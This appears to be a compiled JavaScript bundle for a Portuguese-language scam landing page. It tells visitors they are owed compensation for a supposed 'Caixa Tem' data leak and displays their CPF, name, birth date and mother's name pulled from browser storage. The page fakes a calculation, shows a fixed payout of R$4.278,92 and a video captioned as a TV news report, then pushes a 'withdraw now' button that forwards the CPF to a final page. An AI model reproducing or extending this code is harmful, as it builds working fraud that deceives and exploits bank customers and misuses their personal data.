(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
  [907], {
    354: (e, t, a) => {
      Promise.resolve().then(a.bind(a, 1773))
    },
    1734: (e, t, a) => {
      "use strict";
      a.d(t, {
        NL: () => i,
        QU: () => l,
        W_: () => n,
        no: () => r,
        st: () => s
      });
      let s = "1fc42b5a-eaab-415e-abd7-fabc509db48f",
        n = "684f8f8a-d47",
        i = 112,
        l = "https://viewer-production-9742.up.railway.app",
        r = "rodando-v-3-apinovo-m4n9uej"
    },
    1773: (e, t, a) => {
      "use strict";
      a.r(t), a.d(t, {
        default: () => _
      });
      var s = a(6814),
        n = a(2094),
        i = a(9025),
        l = a(2900),
        r = a(6063),
        d = a(8421);

      function o(e) {
        let {
          durationInSeconds: t,
          onComplete: a,
          color: i = "#41B93C"
        } = e, [l, r] = (0, n.useState)(0);
        return (0, n.useEffect)(() => {
          if (t <= 0) return void r(100);
          r(0);
          let e = setInterval(() => {
            r(a => a >= 100 ? (clearInterval(e), 100) : a + 100 / (10 * t))
          }, 100);
          return () => clearInterval(e)
        }, [t]), (0, n.useEffect)(() => {
          l >= 100 && a && a()
        }, [l, a]), (0, s.jsx)("div", {
          className: "w-full rounded-full h-2.5",
          style: {
            backgroundColor: "".concat(i, "20")
          },
          children: (0, s.jsx)("div", {
            className: "h-2.5 rounded-full transition-all duration-100 ease-linear",
            style: {
              width: "".concat(Math.min(l, 100), "%"),
              background: "linear-gradient(90deg, #015ea2, #1875a7, #2586a7, #3498a8)"
            }
          })
        })
      }
      var c = a(8388),
        u = a(7226),
        m = a(2726),
        p = a(9579),
        h = a(1734),
        x = a(7);
      let f = (0, a(7670).A)("dollar-sign", [
        ["line", {
          x1: "12",
          x2: "12",
          y1: "2",
          y2: "22",
          key: "7eqyqh"
        }],
        ["path", {
          d: "M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6",
          key: "1b0p4s"
        }]
      ]);
      var v = a(6695),
        w = a(1272),
        b = a(751);
      let g = function(e) {
        let {
          queryLoading: t,
          cpf: a,
          name: n,
          birthDate: i,
          motherName: l,
          status: r
        } = e;
        return (0, s.jsx)(v.Zp, {
          className: "p-2 rounded-md",
          children: (0, s.jsxs)("div", {
            className: "space-y-2",
            children: [(0, s.jsxs)("div", {
              className: "flex items-center gap-3 p-2 bg-white border border-gray-200 rounded-lg",
              children: [t ? (0, s.jsx)(w.E, {
                className: "size-8"
              }) : (0, s.jsx)("svg", {
                className: "size-8 text-[#165BA7]",
                fill: "none",
                stroke: "currentColor",
                viewBox: "0 0 24 24",
                children: (0, s.jsx)("path", {
                  strokeLinecap: "round",
                  strokeLinejoin: "round",
                  strokeWidth: "2",
                  d: "M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2"
                })
              }), t ? (0, s.jsx)(w.E, {
                className: "h-4 w-32"
              }) : (0, s.jsx)("span", {
                className: "text-gray-700 text-sm font-medium",
                children: a
              })]
            }), (0, s.jsxs)("div", {
              className: "flex items-center gap-3 p-2 bg-white border border-gray-200 rounded-lg",
              children: [t ? (0, s.jsx)(w.E, {
                className: "size-8"
              }) : (0, s.jsx)("svg", {
                className: "size-8 text-[#165BA7]",
                fill: "none",
                stroke: "currentColor",
                viewBox: "0 0 24 24",
                children: (0, s.jsx)("path", {
                  strokeLinecap: "round",
                  strokeLinejoin: "round",
                  strokeWidth: "2",
                  d: "M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"
                })
              }), "          ", t ? (0, s.jsx)(w.E, {
                className: "h-4 w-32"
              }) : (0, s.jsx)("span", {
                className: "text-gray-700 text-sm font-medium",
                children: n
              })]
            }), (0, s.jsxs)("div", {
              className: "flex items-center gap-3 p-2 bg-white border border-gray-200 rounded-lg",
              children: [t ? (0, s.jsx)(w.E, {
                className: "size-8"
              }) : (0, s.jsx)("svg", {
                className: "size-8 text-[#165BA7]",
                fill: "none",
                stroke: "currentColor",
                viewBox: "0 0 24 24",
                children: (0, s.jsx)("path", {
                  strokeLinecap: "round",
                  strokeLinejoin: "round",
                  strokeWidth: "2",
                  d: "M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"
                })
              }), t ? (0, s.jsx)(w.E, {
                className: "h-4 w-32"
              }) : (0, s.jsx)("span", {
                className: "text-gray-700 text-sm font-medium",
                children: i
              })]
            }), (0, s.jsxs)("div", {
              className: "flex items-center gap-3 p-2 bg-white border border-gray-200 rounded-lg",
              children: [t ? (0, s.jsx)(w.E, {
                className: "size-8"
              }) : (0, s.jsx)("svg", {
                className: "size-8 text-[#165BA7]",
                fill: "none",
                stroke: "currentColor",
                viewBox: "0 0 24 24",
                children: (0, s.jsx)("path", {
                  strokeLinecap: "round",
                  strokeLinejoin: "round",
                  strokeWidth: "2",
                  d: "M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"
                })
              }), t ? (0, s.jsx)(w.E, {
                className: "h-4 w-32"
              }) : (0, s.jsx)("span", {
                className: "text-gray-700 text-sm font-medium",
                children: l || "N\xe3o informado."
              })]
            }), (0, s.jsxs)("div", {
              className: "flex items-center gap-3 p-2 rounded-lg border-l-4 ".concat(r ? "bg-sky-50 border-sky-400" : "bg-green-50 border-green-400"),
              children: [(0, s.jsx)("div", {
                className: "flex-shrink-0 size-8 rounded-full flex items-center justify-center ".concat(r ? "bg-[#A9D7FF]" : "bg-green-200"),
                children: r ? (0, s.jsx)(c.A, {
                  className: "size-4 text-[#165BA6] animate-spin"
                }) : (0, s.jsx)(f, {
                  className: "size-4 text-green-600"
                })
              }), (0, s.jsx)("span", {
                className: "font-medium ".concat(r ? "text-[#165BA6]" : "text-green-700"),
                children: r ? "Calculando sua indeniza\xe7\xe3o..." : "Voc\xea possui R$4.278,92!"
              })]
            })]
          })
        })
      };

      function j(e) {
        let {
          videoId: t
        } = e;
        return (0, n.useEffect)(() => {
          let e = document.getElementById("panda-".concat(t));
          e && e.setAttribute("fetchpriority", "high")
        }, [t]), (0, s.jsx)("iframe", {
          id: "panda-".concat(t),
          src: "https://player-vz-684f8f8a-d47.tv.pandavideo.com.br/embed/?v=".concat(t),
          style: {
            border: "none",
            width: "100%",
            aspectRatio: "16/9"
          },
          allow: "accelerometer;gyroscope;autoplay;encrypted-media;picture-in-picture",
          allowFullScreen: !0
        })
      }
      let y = (0, n.createContext)({
        isVisible: !1
      });

      function N(e) {
        let {
          aspectRatio: t = "16/9",
          className: a = ""
        } = e;
        return (0, s.jsxs)("div", {
          className: "relative overflow-hidden rounded-lg ".concat(a),
          style: {
            aspectRatio: t
          },
          children: [(0, s.jsx)(w.E, {
            className: "absolute inset-0 w-full h-full"
          }), (0, s.jsx)("div", {
            className: "absolute inset-0 flex items-center justify-center",
            children: (0, s.jsx)(w.E, {
              className: "size-16 rounded-full"
            })
          }), (0, s.jsx)("div", {
            className: "absolute bottom-0 left-0 right-0 p-4 bg-gradient-to-t from-black/50 to-transparent",
            children: (0, s.jsxs)("div", {
              className: "flex items-center gap-3",
              children: [(0, s.jsx)(w.E, {
                className: "size-8 rounded"
              }), (0, s.jsx)(w.E, {
                className: "flex-1 h-2 rounded-full"
              }), (0, s.jsx)(w.E, {
                className: "w-12 h-4 rounded"
              }), (0, s.jsx)(w.E, {
                className: "size-8 rounded"
              })]
            })
          })]
        })
      }
      let E = new Set;

      function k(e) {
        let {
          videoId: t,
          accountId: a,
          syncTime: i = 0,
          children: l
        } = e, [r, d] = (0, n.useState)(!1), [o, c] = (0, n.useState)(!0), u = (0, n.useRef)(null), [m, p] = (0, n.useState)(null), h = (0, n.useRef)(!1), x = "".concat(a, "_").concat(t);
        return (0, n.useEffect)(() => {
          let e = document.createElement("div");
          return e.id = "vturb-portal-".concat(t), e.style.width = "100%", e.style.height = "100%", e.style.overflow = "hidden", e.style.borderRadius = "0.5rem", document.body.appendChild(e), p(e), E.add(x), () => {
            (null == e ? void 0 : e.parentNode) && (e.style.display = "none")
          }
        }, [t, a, x]), (0, n.useEffect)(() => {
          if (!m || h.current) return;
          m.innerHTML = '\n      <div id="vid_'.concat(t, '" style="position: relative; width: 100%;">\n        <img id="thumb_').concat(t, '" src="https://images.converteai.net/').concat(a, "/players/").concat(t, '/thumbnail.jpg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover;" alt="thumbnail">\n        <div id="backdrop_').concat(t, '" style="-webkit-backdrop-filter: blur(5px); backdrop-filter: blur(5px); position: absolute; top: 0; height: 100%; width: 100%;"></div>\n      </div>\n    ');
          let e = document.createElement("script");
          e.type = "text/javascript", e.id = "scr_".concat(t), e.text = '\n      try {\n        var s = document.createElement("script");\n        s.src = "https://scripts.converteai.net/'.concat(a, "/players/").concat(t, "/player.js\";\n        s.async = true;\n        s.onload = function() {\n          setTimeout(() => {\n            const event = new CustomEvent('vturb-loaded-").concat(t, "');\n            window.dispatchEvent(event);\n          }, 1000);\n        };\n        document.head.appendChild(s);\n      } catch(e) {\n        console.error(\"VTurb player error:\", e);\n        const event = new CustomEvent('vturb-loaded-").concat(t, "');\n        window.dispatchEvent(event);\n      }\n    "), document.head.appendChild(e), h.current = !0;
          let s = () => {
            c(!1)
          };
          window.addEventListener("vturb-loaded-".concat(t), s);
          let n = setTimeout(() => {
            c(!1)
          }, 6e3);
          if (i > 0) {
            let e = 0,
              t = !1,
              a = "alreadyElsDisplayed".concat(i),
              s = localStorage.getItem(a),
              n = () => {
                t = !0, d(!0), localStorage.setItem(a, "true")
              },
              l = () => {
                var a, s;
                if ("smartplayer" in window && (null == (s = window.smartplayer) || null == (a = s.instances) ? void 0 : a.length)) {
                  let e = window.smartplayer.instances[0];
                  e.on("timeupdate", () => {
                    t || e.smartAutoPlay || e.video.currentTime < i || n()
                  })
                } else {
                  if (e >= 10) return;
                  e += 1, setTimeout(l, 1e3)
                }
              };
            "true" === s ? setTimeout(n, 100) : l()
          } else d(!0);
          return () => {
            window.removeEventListener("vturb-loaded-".concat(t), s), clearTimeout(n)
          }
        }, [m, t, a, i]), (0, n.useEffect)(() => {
          if (!u.current || !m) return;
          let e = () => {
            u.current && m && (m.style.display = "block", u.current.appendChild(m))
          };
          e();
          let t = setTimeout(e, 100);
          return () => clearTimeout(t)
        }, [m]), (0, s.jsxs)(y.Provider, {
          value: {
            isVisible: r
          },
          children: [(0, s.jsxs)("div", {
            className: "rounded-lg overflow-hidden relative",
            style: {
              margin: "0 auto",
              width: "100%",
              aspectRatio: "16/9"
            },
            children: [o && (0, s.jsx)("div", {
              className: "absolute inset-0 z-10",
              children: (0, s.jsx)(N, {})
            }), (0, s.jsx)("div", {
              ref: u,
              className: "rounded-lg overflow-hidden",
              style: {
                position: "relative",
                width: "100%",
                height: "100%",
                opacity: +!o,
                transition: "opacity 0.3s ease-in-out"
              }
            })]
          }), l]
        })
      }
      var z = a(9005),
        S = (0, n.lazy)(async () => a.e(463).then(a.bind(a, 3463)).then(e => ({
          default: e.WistiaPlayerWrapper
        }))),
        R = (0, n.forwardRef)((e, t) => {
          let {
            aspect: a,
            embedHost: i,
            mediaId: l,
            swatch: r,
            style: d
          } = e, o = (0, z.lo)(l, "embedHost", i ?? void 0), c = (0, z.Kg)(o) ? o : "fast.wistia.com", u = void 0 !== a, m = (0, z.t9)({
            mediaId: l,
            embedHost: c,
            aspect: a,
            shouldLoadSwatch: r
          });
          return (0, s.jsx)(n.Suspense, {
            fallback: u && (0, s.jsxs)(n.Fragment, {
              children: [(0, s.jsx)("style", {
                children: m
              }), (0, s.jsx)("wistia-player", {
                "media-id": l,
                style: d
              })]
            }),
            children: (0, s.jsx)(S, {
              ref: t,
              ...e
            })
          })
        });

      function L(e) {
        let {
          videoId: t,
          aspectRatio: a = 16 / 9,
          className: i = "",
          autoPlay: l = !1,
          muted: r = !1,
          playerColor: d,
          onReady: o,
          onPlay: c,
          onPause: u,
          onEnd: m
        } = e, p = (0, n.useRef)(null), [h, x] = (0, n.useState)(!0);
        return (0, n.useEffect)(() => {
          let e = p.current;
          if (!e) return;
          let t = () => {
            x(!1), o && o()
          };
          return e.addEventListener("ready", t), c && e.addEventListener("play", c), u && e.addEventListener("pause", u), m && e.addEventListener("end", m), () => {
            e.removeEventListener("ready", t), c && e.removeEventListener("play", c), u && e.removeEventListener("pause", u), m && e.removeEventListener("end", m)
          }
        }, [o, c, u, m]), (0, s.jsxs)("div", {
          className: "relative overflow-hidden rounded-lg ".concat(i),
          style: {
            aspectRatio: "".concat(a)
          },
          children: [h && (0, s.jsx)("div", {
            className: "absolute inset-0 z-10",
            children: (0, s.jsx)(N, {
              aspectRatio: "".concat(a)
            })
          }), (0, s.jsx)(R, {
            ref: p,
            mediaId: t,
            aspect: a,
            autoplay: l,
            muted: r,
            playerColor: d,
            style: {
              opacity: +!h,
              transition: "opacity 0.3s ease-in-out"
            }
          })]
        })
      }

      function C(e) {
        let {
          provider: t
        } = e;
        switch (t) {
          case "vturb":
            return (0, s.jsx)(k, {
              ...e
            });
          case "panda":
            return (0, s.jsx)(j, {
              ...e
            });
          case "wistia":
            return (0, s.jsx)(L, {
              ...e
            });
          default:
            return null
        }
      }

      function $() {
        let e = (0, l.useRouter)(),
          t = (0, l.useSearchParams)(),
          a = null == t ? void 0 : t.toString(),
          [d, f] = (0, n.useState)(!0),
          [v, w] = (0, n.useState)(!1),
          {
            firstName: b,
            cpf: j,
            name: y,
            birthDate: N,
            motherName: E,
            isEmpty: k,
            isLoading: z
          } = (0, i.B)();
        (0, n.useEffect)(() => {
          !z && k && e.push("/inicio".concat(a ? "?".concat(a) : ""))
        }, [k, z, a, e]);
        (0, n.useEffect)(() => {
          let e = setTimeout(() => {
            f(!1);
          }, 120000);
          return () => clearTimeout(e);
        }, []);
        let S = async a => {
          a.preventDefault(), w(!0);
          let s = new URLSearchParams((null == t ? void 0 : t.toString()) || "");
          s.set("cpf", j.replace(/\D/g, "")), await new Promise(e => setTimeout(e, 2e3)), window.location.href = "/4/final.html?".concat(s.toString()), w(!1)
        }, R = (0, r.bb)(null != j ? j : "");
        return (0, s.jsxs)("div", {
          className: "min-h-screen w-full bg-site",
          style: {
            background: "linear-gradient(90deg, #015ea2, #1875a7, #2586a7, #3498a8)"
          },
          children: [(0, s.jsx)(x.A, {
            loading: z,
            userName: b
          }), (0, s.jsx)("main", {
            className: "flex flex-col items-center px-4",
            children: (0, s.jsx)("div", {
              className: "w-full max-w-md mt-4",
              children: (0, s.jsxs)(u.Zp, {
                className: "w-full bg-white rounded-lg shadow-md overflow-hidden p-2",
                children: [(0, s.jsxs)(u.Wu, {
                  className: "p-4 space-y-2",
                  children: [d ? (0, s.jsxs)("div", {
                    children: [(0, s.jsxs)("h3", {
                      className: "text-start text-[#165BA7] text-lg font-bold mb-2",
                      children: ["Ol\xe1 ", b, ", aguarde enquanto sua indeniza\xe7\xe3o \xe9 calculada!"]
                    }), (0, s.jsx)("p", {
                      className: "text-sm text-start mb-4",
                      children: "A sua indeniza\xe7\xe3o est\xe1 prevista entre R$1.518,00 a R$15.000,00 devido ao vazamento de dados que prejudicou todos os usu\xe1rios da Caixa Tem."
                    })]
                  }) : (0, s.jsxs)("div", {
                    children: [(0, s.jsx)("h3", {
                      className: "text-start text-[#165BA7] text-lg font-bold mb-2",
                      children: "Parab\xe9ns! Voc\xea tem uma indeniza\xe7\xe3o de R$4.278,92 dispon\xedvel para saque."
                    }), (0, s.jsx)("p", {
                      className: "text-sm text-start mb-4",
                      children: "\xc9 necess\xe1rio que um atendente autorize o seu recebimento. Clique no bot\xe3o abaixo para iniciar seu atendimento online."
                    })]
                  }), d && (0, s.jsxs)("div", {
                    className: "rounded-md aspect-video my-6",
                    children: [(0, s.jsx)(C, {
                      videoId: h.st,
                      accountId: h.W_,
                      provider: "panda"
                    }), (0, s.jsx)("span", {
                      className: "text-xs",
                      children: "- Jornal da Record, publicado em 11/09/2025"
                    })]
                  }), !d && (0, s.jsx)(p.$, {
                    className: "w-full font-semibold py-6 text-base mb-6 disabled:opacity-50 disabled:cursor-not-allowed ".concat(v ? "bg-gray-400 hover:bg-gray-400 text-white" : "bg-[#F29201] hover:bg-opacity-90 text-white"),
                    disabled: v,
                    onClick: S,
                    children: v ? (0, s.jsxs)("div", {
                      className: "flex items-center justify-center space-x-2",
                      children: [(0, s.jsx)(c.A, {
                        className: "h-4 w-4 animate-spin"
                      }), (0, s.jsx)("span", {
                        children: "Carregando!"
                      })]
                    }) : "Efetuar Meu Saque Agora!"
                  }), (0, s.jsx)(g, {
                    queryLoading: z,
                    status: d,
                    cpf: R,
                    name: y,
                    motherName: E,
                    birthDate: N
                  })]
                }), (0, s.jsx)(u.wL, {
                  children: (0, s.jsx)(m.w, {})
                })]
              })
            })
          })]
        })
      }

      function _() {
        return (0, s.jsx)(n.Suspense, {
          fallback: (0, s.jsx)(d.a, {}),
          children: (0, s.jsx)($, {})
        })
      }
    },
    7226: (e, t, a) => {
      "use strict";
      a.d(t, {
        Wu: () => d,
        Zp: () => l,
        aR: () => r,
        wL: () => o
      });
      var s = a(6814);
      a(2094);
      var n = a(4682),
        i = a(2726);

      function l(e) {
        let {
          className: t,
          ...a
        } = e;
        return (0, s.jsx)("div", {
          className: (0, n.cn)("w-full max-w-md mx-auto bg-white rounded-lg shadow-lg overflow-hidden", t),
          ...a
        })
      }

      function r(e) {
        let {
          className: t,
          ...a
        } = e;
        return (0, s.jsx)("div", {
          className: (0, n.cn)("text-white p-4 flex flex-col items-center", t),
          ...a
        })
      }

      function d(e) {
        let {
          className: t,
          ...a
        } = e;
        return (0, s.jsx)("div", {
          className: (0, n.cn)("p-4 space-y-6", t),
          ...a
        })
      }

      function o(e) {
        let {
          className: t,
          ...a
        } = e;
        return (0, s.jsx)("div", {
          className: (0, n.cn)(t),
          ...a,
          children: (0, s.jsx)(i.w, {})
        })
      }
    },
    9005: (e, t, a) => {
      "use strict";
      a.d(t, {
        $l: () => p,
        Kg: () => r,
        Rx: () => u,
        Tn: () => o,
        aF: () => f,
        lo: () => m,
        t9: () => v
      }), Number.NaN;
      var s = e => null === e,
        n = e => void 0 === e,
        i = e => s(e) || n(e),
        l = e => !i(e),
        r = e => "string" == typeof e,
        d = e => "number" == typeof e,
        o = e => l(e) && "function" == typeof e,
        c = e => l(e) && "boolean" == typeof e,
        u = e => d(e) || r(e) || c(e),
        m = (e, t, a) => {
          let s = a;
          return "undefined" == typeof window || (l(window.wistiaOptions?._all) && l(window.wistiaOptions._all[t]) && u(window.wistiaOptions._all[t]) && (s = window.wistiaOptions._all[t]), l(window.wistiaOptions?.[e]) && l(window.wistiaOptions[e]) && u(window.wistiaOptions[e][t]) && (s = window.wistiaOptions[e][t])), s
        },
        p = e => e.replace(/[A-Z]+(?![a-z])|[A-Z]/g, (e, t) => (0 !== t ? "-" : "") + e.toLowerCase()),
        h = async e => {
          let t = new Image;
          return t.src = e, await t.decode(), t
        }, x = (e, t) => `https://${t}/embed/medias/${e}/swatch`, f = async (e, t = "fast.wistia.com") => {
          let {
            naturalHeight: a,
            naturalWidth: s
          } = await h(x(e, t));
          return s / a
        }, v = ({
          mediaId: e,
          embedHost: t = "fast.wistia.com",
          aspect: a = 1.7,
          shouldLoadSwatch: s = !0,
          roundedPlayer: n = 0
        }) => {
          let i = {
            background: s ? `center / contain no-repeat url(${x(e,t)})` : void 0,
            borderRadius: `${n}px`,
            display: "block",
            filter: "blur(5px)",
            paddingTop: `${100/a}%`
          };
          return `
    wistia-player[media-id='${e}']:not(:defined) {
      ${Object.entries(i).map(([e,t])=>`${p(e)}: ${t};`).join("\r\n")}
    }

    wistia-player[media-id='${e}']:state(--initializing) {
      ${Object.entries(i).map(([e,t])=>`${p(e)}: ${t};`).join("\r\n")}
    }
  `
        }
    },
    9025: (e, t, a) => {
      "use strict";
      a.d(t, {
        B: () => i
      });
      var s = a(2094),
        n = a(6063);

      function i() {
        let [e, t] = (0, s.useState)(null), [a, i] = (0, s.useState)(!0);
        (0, s.useEffect)(() => {
          let e = localStorage.getItem("cpf-data");
          if (e) try {
            let a = JSON.parse(e);
            t(a)
          } catch (e) {
            localStorage.removeItem("cpf-data"), t(null)
          }
          i(!1)
        }, []);
        let l = (null == e ? void 0 : e.nome) ? (0, n.kR)(e.nome) : (null == e ? void 0 : e.name) ? (0, n.kR)(e.name) : null,
          r = (null == e ? void 0 : e.nome) ? (0, n.kR)(e.nome.split(' ')[0]) : (null == e ? void 0 : e.firstName) ? (0, n.kR)(e.firstName) : null,
          d = (null == e ? void 0 : e.nome_mae) ? (0, n.kR)(e.nome_mae) : (null == e ? void 0 : e.motherName) ? (0, n.kR)(e.motherName) : null,
          o = (null == e ? void 0 : e.cpf) || null,
          c = (null == e ? void 0 : e.data_nascimento) || (null == e ? void 0 : e.dataNascimento) || (null == e ? void 0 : e.nascimento) || (null == e ? void 0 : e.birthDate) || (null == e ? void 0 : e.birth_date) || "Não informado";
        return {
          isLoading: a,
          isEmpty: !e,
          isInvalid: !l || !o || !c || !d,
          name: l,
          firstName: r,
          cpf: o,
          birthDate: c,
          motherName: d,
          gender: (null == e ? void 0 : e.gender) || null,
          full: e
        }
      }
    }
  },
  e => {
    var t = t => e(e.s = t);
    e.O(0, [734, 539, 669, 788, 97, 358], () => t(354)), _N_E = e.O()
  }
]);